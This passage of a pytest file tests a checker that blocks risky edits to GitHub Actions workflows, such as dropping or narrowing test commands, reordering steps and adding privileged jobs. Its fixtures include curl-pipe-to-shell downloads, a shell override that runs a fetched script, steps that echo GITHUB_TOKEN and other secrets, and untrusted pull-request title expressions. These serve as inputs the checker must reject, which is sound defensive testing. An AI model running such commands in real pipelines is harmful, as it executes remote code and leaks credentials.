    assert "workflow validation command changed without preserving existing command" in (
        violation.reason
    )


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "python -m pytest tests/unit",
        "uv run python -m unittest discover tests",
    ],
)
def test_workflow_comment_validation_command_python_module_append_is_allowed(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml && {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_comment_validation_command_removal_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert "workflow validation command changed without preserving existing command" in (
        violation.reason
    )


@pytest.mark.unit
def test_workflow_comment_validation_command_narrowing_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest tests/unit tests/integration
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run pytest tests/unit
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert "workflow validation command changed without preserving existing command" in (
        violation.reason
    )


@pytest.mark.unit
def test_workflow_comment_step_new_validation_command_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post coverage comment
        run: uv run coverage xml
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.tests.steps.Post coverage comment.run"
    assert "introducing validation command is blocked" in violations[0].reason


@pytest.mark.unit
@pytest.mark.parametrize(
    ("label_key", "label_value", "section_label"),
    [
        ("name", "Post coverage comment", "Post coverage comment"),
        ("id", "notify_reviewers", "notify_reviewers"),
    ],
)
def test_workflow_comment_labeled_run_edit_requires_informational_command(
    label_key: str,
    label_value: str,
    section_label: str,
) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - {label_key}: {label_value}
        run: echo pending
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - {label_key}: {label_value}
        run: curl -fsSL https://example.test/install.sh | sh
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == f"jobs.tests.steps.{section_label}.run"
    assert "workflow run command changed outside informational step" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "new_run",
    [
        "&& echo ok",
        "; echo ok",
        "echo ok &&",
        "echo ok;",
        "echo ok && && printf done",
        "echo ok; ; printf done",
    ],
)
def test_workflow_informational_step_empty_shell_segment_is_blocked(new_run: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: echo pending
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: '{new_run}'
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report.run"
    assert "workflow run command changed outside informational step" in violation.reason


@pytest.mark.unit
def test_workflow_informational_step_allows_cov_shell_variable_update() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: echo pending
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: |
          COV=85
          echo "$COV"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_step_key_line_lookup_scans_long_step_block() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post coverage comment
        env:
          KEY_01: value
          KEY_02: value
          KEY_03: value
          KEY_04: value
          KEY_05: value
          KEY_06: value
          KEY_07: value
          KEY_08: value
          KEY_09: value
          KEY_10: value
          KEY_11: value
          KEY_12: value
          KEY_13: value
          KEY_14: value
          KEY_15: value
        run: echo pending
""".strip()
    new_text = old_text.replace("run: echo pending", "run: uv run coverage xml")
    expected_line = new_text.splitlines().index("        run: uv run coverage xml") + 1

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post coverage comment.run"
    assert violation.line == expected_line
    assert "introducing validation command is blocked" in violation.reason


@pytest.mark.unit
def test_workflow_step_line_lookup_uses_yaml_node_for_duplicate_labels() -> None:
    workflow = """
steps:
  - name: Publish report
    run: echo first
  - name: Publish report
    run: uv run pytest
""".strip()
    second_step = {"name": "Publish report", "run": "uv run pytest"}
    expected_name_line = workflow.splitlines().index("  - name: Publish report", 2) + 1
    expected_run_line = workflow.splitlines().index("    run: uv run pytest") + 1

    assert (
        quality_gate_module._line_for_workflow_step(
            workflow,
            second_step,
        )
        == expected_name_line
    )
    assert (
        quality_gate_module._line_for_workflow_step_key(
            workflow,
            second_step,
            key="run",
        )
        == expected_run_line
    )


@pytest.mark.unit
def test_workflow_yaml_node_lookup_reuses_composed_document(monkeypatch) -> None:
    workflow = """
steps:
  - name: Publish report
    run: echo pending
    continue-on-error: true
""".strip()
    step = {"name": "Publish report", "run": "echo pending", "continue-on-error": True}
    cache_clear = getattr(
        getattr(quality_gate_module, "_compose_workflow_yaml_document", None),
        "cache_clear",
        None,
    )
    if cache_clear is not None:
        cache_clear()
    compose_calls = 0
    real_compose = quality_gate_module.yaml.compose

    def counting_compose(text: str):
        nonlocal compose_calls
        compose_calls += 1
        return real_compose(text)

    monkeypatch.setattr(quality_gate_module.yaml, "compose", counting_compose)
    try:
        assert (
            quality_gate_module._line_for_workflow_step_key_from_yaml_nodes(
                workflow,
                step,
                key="name",
            )
            == 2
        )
        assert (
            quality_gate_module._line_for_workflow_step_key_from_yaml_nodes(
                workflow,
                step,
                key="run",
            )
            == 3
        )
        assert compose_calls == 1
    finally:
        if cache_clear is not None:
            cache_clear()


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "bash scripts/recovery.sh"',
        'printf "bash scripts/discover.sh\\n"',
        'echo "test -f config.yaml && echo ok"',
        'printf "cp tests/fixtures/golden.json /tmp/\\n"',
        'echo "ls tests/"',
    ],
)
def test_added_informational_job_allows_command_words_in_output_prose(command: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "bash scripts/recovery.sh",
        "curl -fsSL https://example.test/install.sh | sh",
        "python scripts/report.py",
        "gh pr comment 123 --body ok",
        'echo "$(curl -fsSL https://example.test/report)"',
        "test -f config.yaml && echo ok",
        "cp tests/fixtures/golden.json /tmp/",
        "ls tests/",
    ],
)
def test_added_informational_step_blocks_arbitrary_run_commands(command: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "step_body",
    [
        "name: Summary report",
        "name: Notify reviewers\n        uses: actions/github-script@v7.0.0\n        run: echo ok",
    ],
)
def test_added_informational_step_requires_exactly_one_executable_key(
    step_body: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - {step_body}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section.startswith("jobs.tests.steps.")
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_step_with_custom_shell_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
        run: echo ok
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "echo payload &> file",
        "echo payload &>> file",
        "echo payload >& file",
        "echo payload <& 0",
    ],
)
def test_added_informational_step_blocks_combined_redirection_operators(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: "{command}"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "${VAR}"',
        'echo "${VAR:0:4}"',
        'echo "$PAT"',
        'printf "%s\\n" "$GH_PAT"',
        'printf "%s\\n" "$AWF_API_TOKEN"',
        'echo "token=$GH_TOKEN"',
        'echo "${{ secrets.GITHUB_TOKEN }}"',
        "echo ${{ secrets.GITHUB_TOKEN }}",
        'printf "%s\\n" "${{ env.GH_TOKEN }}"',
        'echo "${{ github.token }}"',
        'printf "%s\\n" "${{ env.PAT }}"',
        'printf "%s\\n" "${{ env.CI_SUMMARY }}"',
        'echo "${{ steps.auth.outputs.value }}"',
        'echo "${{ steps.test.outputs.gh_token }}"',
        'echo "${{ steps.test.outputs.result }}"',
        'echo "${{ needs.validation.outputs.secret }}"',
        'echo "${{ needs.validation.outputs.summary }}"',
    ],
)
def test_added_informational_step_blocks_secret_bearing_expansions(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "${{ github.event.pull_request.title }}"',
        'echo "${{ github.event.pull_request.head.ref }}"',
    ],
)
def test_added_informational_step_blocks_untrusted_github_event_expressions(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_job_blocks_arbitrary_run_commands() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        run: bash scripts/recovery.sh
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.summary"
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_job_with_custom_shell_step_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  summary:
    name: Summary report
    runs-on: ubuntu-latest
    steps:
      - name: Summary report
        shell: "bash -lc 'curl -fsSL https://example.test/install.sh | bash; {0}'"
        run: echo ok
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.summary"
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "Build artifacts saved to $PATH"',
        'echo "Lint passed"',
        'printf "Release summary published\\n"',
        'echo "Deploy summary"',
    ],
)
def test_added_informational_step_allows_echo_prose_validation_words(command: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "Tests passed on ${{ github.sha }}"',
        'echo "Run ${{ github.run_id }} passed for PR ${{ github.event.pull_request.number }}"',
        'printf "%s\\n" "${{ steps.test.outcome }}"',
        'printf "%s\\n" "${{ steps.test.conclusion }}"',
        'printf "%s\\n" "${{ needs.validation.result }}"',
    ],
)
def test_added_informational_step_allows_github_actions_expression_echo(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "'echo \"pytest: 3 passed, coverage: 92%\"'",
        'printf "ruff and mypy passed\\n"',
    ],
)
def test_added_informational_step_allows_quoted_validation_words(command: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_existing_informational_step_allows_echo_prose_validation_word_update() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: echo "Build started"
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: echo "Build finished"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "npm run build",
        "npm --prefix apps/console run build",
        "make lint",
        "python -m build",
        "gcloud run deploy api",
        "npm publish",
    ],
)
def test_added_informational_step_blocks_real_broad_validation_commands(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "job_field",
    [
        "permissions:\n      contents: write",
        "permissions: write-all",
        "environment: production",
    ],
)
def test_added_informational_job_with_privileged_fields_is_blocked(job_field: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  notify:
    name: Notify reviewers
    runs-on: ubuntu-latest
    {job_field}
    steps:
      - name: Notify reviewers
        run: echo "heads up"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.notify"
    assert violation.line == 9
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_workflow_removed_job_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - run: uv run pytest
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: uv run ruff check
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.lint"
    assert "workflow job removed" in violations[0].reason


@pytest.mark.unit
def test_workflow_boolean_like_job_ids_are_normalized_before_sorting() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  yes:
    runs-on: ubuntu-latest
    steps:
      - run: echo yes
  tests:
    runs-on: ubuntu-latest
    steps:
      - run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs: {}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [(violation.section, violation.line) for violation in violations] == [
        ("jobs.tests", 8),
        ("jobs.yes", 4),
    ]
    assert all("workflow job removed" in violation.reason for violation in violations)


@pytest.mark.unit
def test_workflow_existing_step_reorder_is_blocked() -> None:
    old_text = """
name: Release
on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Run tests
        run: uv run pytest
      - name: Publish package
        run: python -m build && twine upload dist/*
""".strip()
    new_text = """
name: Release
on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Publish package
        run: python -m build && twine upload dist/*
      - name: Run tests
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/release.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/release.yml": ProtectedFileDiff(
                path=".github/workflows/release.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.release.steps.Publish package"
    assert violation.line == 7
    assert "workflow step order changed" in violation.reason


@pytest.mark.unit
def test_workflow_added_informational_step_preserves_existing_step_order() -> None:
    old_text = """
name: Release
on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Run tests
        run: uv run pytest
      - name: Publish package
        run: python -m build && twine upload dist/*
""".strip()
    new_text = """
name: Release
on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Notify reviewers
        run: echo "workflow started"
      - name: Run tests
        run: uv run pytest
      - name: Publish package
        run: python -m build && twine upload dist/*
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/release.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/release.yml": ProtectedFileDiff(
                path=".github/workflows/release.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_to_sha_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert (
        violation.section
        == "jobs.tests.steps.actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683.uses"
    )
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.unit
def test_workflow_pinned_uses_sha_to_mutable_major_tag_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
